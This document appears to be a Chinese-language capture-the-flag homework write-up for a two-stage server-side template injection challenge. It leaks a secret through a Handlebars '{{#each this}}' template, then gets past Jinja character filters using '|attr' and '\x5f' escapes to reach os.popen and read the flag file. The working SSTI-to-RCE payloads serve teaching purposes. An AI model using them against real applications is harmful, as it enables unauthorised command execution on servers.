# HW -  Double SSTI 
###### tags: `資安` `Web`

## 題目解析
畫面進來就是一個輸入框要你做 SSTI。

![](https://i.imgur.com/6ry7b0k.png)

輸入名字就是得到簡單的輸出。

![](https://i.imgur.com/OZuY1oB.png)


## 解題流程
### First-stage
我們先檢視網頁原始碼看一下有沒有什麼線索，看到註解有寫 server source code 的 path，連進去看一下。

![](https://i.imgur.com/25VCQZS.png)

```express=
// Proxy endpoints
// Try to figure out the path!
app.use(`/2nd_stage_${secret}`, createProxyMiddleware({
    target: "http://jinja",
    changeOrigin: true,
    pathRewrite: {
        [`^/2nd_stage_${secret}`]: '',
    },
}));

app.get("/source", (_, response) => {
    response.sendFile(__filename);
});

app.get('/', (_, response) => {
    response.sendFile(__dirname + "/index.html");
});

app.get("/welcome", (request, response) => {
    const name = request.query.name ?? 'Guest';
    if (name.includes('secret')) {
        response.send("Hacker!");
        return;
    }
    const template = handlebars.compile(`<h1>Hello ${name}! SSTI me plz.</h1>`);
    response.send(template({ name, secret }));
})
```

可以看到有個 2nd_stage 的頁面，以此 server 做 proxy，所以要想辦法透過 SSTI 拿到 secret，拿到就能連進 2nd_stage 的網頁。

在 /welcome 底下可以看到 express 框架用的是 handlebars 這個 template 語言，是基於 Javascript 的，因為是沒接觸過的模板語言，所以上了 [handlebars官網](https://handlebarsjs.com/) 看了一下 Guide，其 template 引入方式是 **(\<p>{{firstname}} {{lastname}}\</p>)** 這樣，另外他還有很多 Helpers 的用法，if、each、with 等，想了解可以去上面官網看看。

而我們這邊要用到的是 **each** 這個 Helper，用法有點像 python 的 foreach，只是要想 HTML 那樣做一個 tag 把內容包起來，透過與 this 的結合，能從當前 server 傳回的 {name, secret}，分別取出 name 跟 secret，所以把下面這樣的 template labguage 寫入輸入框送出，就可以看到分別印出的 name 跟 secret 了。

:::info
{{#each this}}{{this}}{{/each}}
:::


![](https://i.imgur.com/Z8qNswu.png)

### Second-stage
有了 secret 我們就知道 2nd_stage 的完整 url，連進去可以看到又是一個輸入框要再做一次 SSTI，一樣我們要先確認 template language 是哪個，從第一個 source code 的 createProxyMiddleware 可以看倒是導到 jinja 的模板引擎。
```
https://double-ssti.chal.h4ck3r.quest/2nd_stage_77777me0w_me0w_s3cr3t77777
```

![](https://i.imgur.com/od8aZyC.png)

jinja上課就有教過了，不過稍微試了一下他其實有擋一些特殊字元，"\["、"\]"、"\."、"\_\_" 都被擋掉了，因此沒法像 LAB 那麼簡單可以透過對上級 object class 取 subclass 找到 os 模組做指令操作，主要是因為 \[132\] 會被擋掉，其他部分倒是都可以做一些轉換繞過

:::danger
{{().\_\_class__.\_\_base__.\_\_subclasses__()[132].\_\_init__.\_\_globals\_\_['popen']('cd /; ls').read()}}
:::

Google 大神了一下發現 magic method 的呼叫可以用 jinja 特殊的 filter 繞過，在 "{{ }}" 裡利用 |attr() 來呼叫前一 object 的屬性值，"\_\_" 也利用 "\x5f" 替代，無法用 "\[\]"，我們就從 request 下手，一樣一層層進去想辦法找到 os 模組，就能用os.popen().read()來做到 RCE。

```python=
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cd /; cat y000_i_am_za_fl4g')|attr('read')()}}
```
## FLAG 截圖
![](https://i.imgur.com/AOZB1TP.png)
